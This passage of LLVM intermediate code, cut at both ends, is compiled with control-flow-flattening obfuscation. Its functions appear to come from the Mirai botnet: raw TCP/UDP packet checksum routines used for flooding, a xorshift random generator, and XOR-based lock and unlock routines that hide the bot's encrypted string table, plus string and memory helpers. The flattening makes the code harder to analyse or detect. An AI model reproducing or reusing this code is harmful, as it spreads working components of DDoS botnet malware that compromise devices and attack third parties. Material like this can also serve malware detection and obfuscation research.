  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i32, i32* %11, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %11, align 4
  store i32 676711222, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = call i64 @time(i64* null) #6
  %228 = load i32, i32* %19, align 4
  %229 = sext i32 %228 to i64
  %230 = icmp sgt i64 %227, %229
  %231 = select i1 %230, i32 398086232, i32 1191901104
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 -685320936, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 119138796, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %233, %232, %226, %223, %213, %205, %196, %190, %189, %188, %185, %184, %183, %165, %139, %129, %128, %110, %109, %101, %92, %83, %73, %67, %66, %63, %60, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -1254301583, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1254301583, label %6
    i32 1051447193, label %10
    i32 930054775, label %17
    i32 -805988769, label %20
    i32 -2019164203, label %24
    i32 -1261961558, label %31
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  %9 = select i1 %8, i32 1051447193, i32 -805988769
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  store i32 930054775, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 %18, 2
  store i32 %19, i32* %4, align 4
  store i32 -1254301583, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = icmp eq i32 %21, 1
  %23 = select i1 %22, i32 -2019164203, i32 -1261961558
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i16*, i16** %3, align 8
  %26 = load i16, i16* %25, align 2
  %27 = trunc i16 %26 to i8
  %28 = sext i8 %27 to i64
  %29 = load i64, i64* %5, align 8
  %30 = add i64 %29, %28
  store i64 %30, i64* %5, align 8
  store i32 -1261961558, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = add i64 %33, %35
  store i64 %36, i64* %5, align 8
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = add i64 %39, %38
  store i64 %40, i64* %5, align 8
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 %41, -1
  %43 = trunc i64 %42 to i16
  ret i16 %43

loopEnd:                                          ; preds = %24, %20, %17, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  %switchVar = alloca i32
  store i32 297321690, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 297321690, label %23
    i32 1578422729, label %27
    i32 1700427668, label %37
    i32 -1597278884, label %41
    i32 -2112624565, label %48
    i32 994288309, label %79
    i32 -1984669452, label %84
    i32 1212540337, label %90
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  %26 = select i1 %25, i32 1578422729, i32 1700427668
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16*, i16** %9, align 8
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load i32, i32* %12, align 4
  %32 = add i32 %31, %30
  store i32 %32, i32* %12, align 4
  %33 = load i16*, i16** %9, align 8
  %34 = getelementptr inbounds i16, i16* %33, i32 1
  store i16* %34, i16** %9, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sub nsw i32 %35, 2
  store i32 %36, i32* %8, align 4
  store i32 297321690, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, 1
  %40 = select i1 %39, i32 -1597278884, i32 -2112624565
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i16*, i16** %9, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  store i32 -2112624565, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %10, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 65535
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* %10, align 4
  %55 = and i32 %54, 65535
  %56 = load i32, i32* %12, align 4
  %57 = add i32 %56, %55
  store i32 %57, i32* %12, align 4
  %58 = load i32, i32* %11, align 4
  %59 = lshr i32 %58, 16
  %60 = and i32 %59, 65535
  %61 = load i32, i32* %12, align 4
  %62 = add i32 %61, %60
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* %11, align 4
  %64 = and i32 %63, 65535
  %65 = load i32, i32* %12, align 4
  %66 = add i32 %65, %64
  store i32 %66, i32* %12, align 4
  %67 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 6
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i16
  %71 = call zeroext i16 @htons(i16 zeroext %70) #7
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* %12, align 4
  %74 = add i32 %73, %72
  store i32 %74, i32* %12, align 4
  %75 = load i16, i16* %7, align 2
  %76 = zext i16 %75 to i32
  %77 = load i32, i32* %12, align 4
  %78 = add i32 %77, %76
  store i32 %78, i32* %12, align 4
  store i32 994288309, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %12, align 4
  %81 = lshr i32 %80, 16
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -1984669452, i32 1212540337
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %12, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = lshr i32 %87, 16
  %89 = add i32 %86, %88
  store i32 %89, i32* %12, align 4
  store i32 994288309, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %12, align 4
  %92 = xor i32 %91, -1
  %93 = trunc i32 %92 to i16
  ret i16 %93

loopEnd:                                          ; preds = %84, %79, %48, %41, %37, %27, %23, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 61)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 61, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  %switchVar = alloca i32
  store i32 1768129810, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1768129810, label %9
    i32 935187920, label %14
    i32 729130976, label %24
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  %13 = select i1 %12, i32 935187920, i32 729130976
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = call i32 @rand_next()
  %16 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %17 = call i32 @util_strlen(i8* %16)
  %18 = urem i32 %15, %17
  %19 = zext i32 %18 to i64
  %20 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %3, align 8
  store i8 %21, i8* %22, align 1
  store i32 1768129810, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 61)
  ret void

loopEnd:                                          ; preds = %14, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -1040625714, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1040625714, label %27
    i32 -504301506, label %35
    i32 579499481, label %84
    i32 1370492593, label %87
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  %34 = select i1 %33, i32 -504301506, i32 1370492593
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i32
  %38 = load %struct.table_value*, %struct.table_value** %4, align 8
  %39 = getelementptr inbounds %struct.table_value, %struct.table_value* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = load i32, i32* %3, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = xor i32 %45, %37
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %43, align 1
  %48 = load i8, i8* %6, align 1
  %49 = zext i8 %48 to i32
  %50 = load %struct.table_value*, %struct.table_value** %4, align 8
  %51 = getelementptr inbounds %struct.table_value, %struct.table_value* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = xor i32 %57, %49
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %55, align 1
  %60 = load i8, i8* %7, align 1
  %61 = zext i8 %60 to i32
  %62 = load %struct.table_value*, %struct.table_value** %4, align 8
  %63 = getelementptr inbounds %struct.table_value, %struct.table_value* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = xor i32 %69, %61
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %67, align 1
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i32
  %74 = load %struct.table_value*, %struct.table_value** %4, align 8
  %75 = getelementptr inbounds %struct.table_value, %struct.table_value* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = xor i32 %81, %73
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %79, align 1
  store i32 579499481, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %3, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %3, align 4
  store i32 -1040625714, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %84, %35, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %.reg2mem = alloca i32*
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  store i32* %9, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 -1392029569, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1392029569, label %first
    i32 283711560, label %12
    i32 1695165022, label %18
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %10 = icmp ne i32* %.reload, null
  %11 = select i1 %10, i32 283711560, i32 1695165022
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load %struct.table_value*, %struct.table_value** %5, align 8
  %14 = getelementptr inbounds %struct.table_value, %struct.table_value* %13, i32 0, i32 1
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = load i32*, i32** %4, align 8
  store i32 %16, i32* %17, align 4
  store i32 1695165022, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.table_value*, %struct.table_value** %5, align 8
  %20 = getelementptr inbounds %struct.table_value, %struct.table_value* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  ret i8* %21

loopEnd:                                          ; preds = %12, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 480737372, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 480737372, label %4
    i32 959774598, label %11
    i32 516573680, label %14
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  %10 = select i1 %9, i32 959774598, i32 516573680
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %3, align 4
  %13 = add nsw i32 %12, 1
  store i32 %13, i32* %3, align 4
  store i32 480737372, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  ret i32 %15

loopEnd:                                          ; preds = %11, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strncmp(i8*, i8*, i32) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %8, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 @util_strlen(i8* %12)
  store i32 %13, i32* %9, align 4
  %14 = load i32, i32* %8, align 4
  store i32 %14, i32* %.reg2mem
  %15 = load i32, i32* %7, align 4
  store i32 %15, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -210557881, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -210557881, label %first
    i32 -1406707318, label %18
    i32 1619059359, label %23
    i32 613339387, label %24
    i32 2144710107, label %25
    i32 1619196539, label %30
    i32 -1815264473, label %41
    i32 -1145402003, label %42
    i32 764011904, label %43
    i32 -692052234, label %44
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %16 = icmp slt i32 %.reload, %.reload3
  %17 = select i1 %16, i32 1619059359, i32 -1406707318
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp slt i32 %19, %20
  %22 = select i1 %21, i32 1619059359, i32 613339387
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i8 0, i8* %4, align 1
  store i32 -692052234, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 2144710107, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %7, align 4
  %27 = add nsw i32 %26, -1
  store i32 %27, i32* %7, align 4
  %28 = icmp ne i32 %26, 0
  %29 = select i1 %28, i32 1619196539, i32 764011904
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %5, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %5, align 8
  %33 = load i8, i8* %31, align 1
  %34 = sext i8 %33 to i32
  %35 = load i8*, i8** %6, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %6, align 8
  %37 = load i8, i8* %35, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp ne i32 %34, %38
  %40 = select i1 %39, i32 -1815264473, i32 -1145402003
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i8 0, i8* %4, align 1
  store i32 -692052234, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  store i32 2144710107, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i8 1, i8* %4, align 1
  store i32 -692052234, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* %4, align 1
  ret i8 %45

loopEnd:                                          ; preds = %43, %42, %41, %30, %25, %24, %23, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strcmp(i8*, i8*) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i8, align 1
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %8 = load i8*, i8** %4, align 8
  %9 = call i32 @util_strlen(i8* %8)
  store i32 %9, i32* %6, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* %6, align 4
  store i32 %12, i32* %.reg2mem
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -259179002, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -259179002, label %first
    i32 -1286309766, label %16
    i32 515188842, label %17
    i32 -1460683796, label %18
    i32 1005882005, label %23
    i32 -36428667, label %34
    i32 -1844650019, label %35
    i32 1078310882, label %36
    i32 291007364, label %37
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %14 = icmp ne i32 %.reload, %.reload3
  %15 = select i1 %14, i32 -1286309766, i32 515188842
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i8 0, i8* %3, align 1
  store i32 291007364, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -1460683796, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %6, align 4
  %20 = add nsw i32 %19, -1
  store i32 %20, i32* %6, align 4
  %21 = icmp ne i32 %19, 0
  %22 = select i1 %21, i32 1005882005, i32 1078310882
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8*, i8** %4, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %4, align 8
  %26 = load i8, i8* %24, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %5, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %5, align 8
  %30 = load i8, i8* %28, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp ne i32 %27, %31
  %33 = select i1 %32, i32 -36428667, i32 -1844650019
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 0, i8* %3, align 1
  store i32 291007364, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 -1460683796, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i8 1, i8* %3, align 1
  store i32 291007364, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8, i8* %3, align 1
  ret i8 %38

loopEnd:                                          ; preds = %36, %35, %34, %23, %18, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  %switchVar = alloca i32
  store i32 292853247, i32* %switchVar
